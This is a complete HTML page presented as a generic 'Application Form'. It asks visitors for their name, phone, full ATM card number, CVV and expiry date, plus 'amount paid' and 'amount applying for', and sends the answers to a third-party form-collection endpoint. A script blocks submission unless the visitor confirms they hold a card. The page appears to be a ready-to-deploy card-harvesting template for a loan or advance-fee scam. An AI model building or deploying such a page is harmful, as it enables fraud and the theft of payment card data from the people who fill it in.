<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
    }
    label {
      display: block;
      margin-top: 15px;
    }
    input, select, button {
      padding: 8px;
      width: 100%;
      margin-top: 5px;
    }
    #field9 {
      color: red;
      font-weight: bold;
      margin-top: 10px;
    }
    #submitBtn {
      margin-top: 20px;
    }
  </style>
</head>
<body>

  <h2>Application Form</h2>

  <form action="https://formspree.io/f/your-form-id" method="POST">
    
    <label>Full Name:
      <input type="text" name="full_name" required>
    </label>

    <label>Phone Number:
      <input type="tel" name="phone" required>
    </label>

    <label>ATM Card Number:
      <input type="text" name="card_number" maxlength="16" pattern="\d{16}" required>
    </label>

    <label>CVV (3 digits only):
      <input type="text" name="cvv" maxlength="3" pattern="\d{3}" required>
    </label>

    <label>Expiry Date (MM/YY):
      <input type="text" name="expiry" maxlength="5" pattern="(0[1-9]|1[0-2])\/\d{2}" placeholder="MM/YY" required>
    </label>

    <label>Amount Paid:
      <input type="number" name="amount_paid" required>
    </label>

    <label>Amount Applying For:
      <input type="number" name="amount_applied" required>
    </label>

    <label>Do you have an ATM card?
      <select name="has_atm" id="atmSelect" required>
        <option value="">-- Select --</option>
        <option value="yes">Yes</option>
        <option value="no">No</option>
      </select>
    </label>

    <div id="field9" style="display: none;">YOU MUST HAVE AN ATM CARD TO PROCEED</div>

    <button type="submit" id="submitBtn">Submit</button>

  </form>

  <script>
    const atmSelect = document.getElementById('atmSelect');
    const field9 = document.getElementById('field9');
    const submitBtn = document.getElementById('submitBtn');

    atmSelect.addEventListener('change', () => {
      if (atmSelect.value === 'no') {
        field9.style.display = 'block';
        submitBtn.style.display = 'none';
      } else {
        field9.style.display = 'none';
        submitBtn.style.display = 'block';
      }
    });
  </script>

</body>
</html>
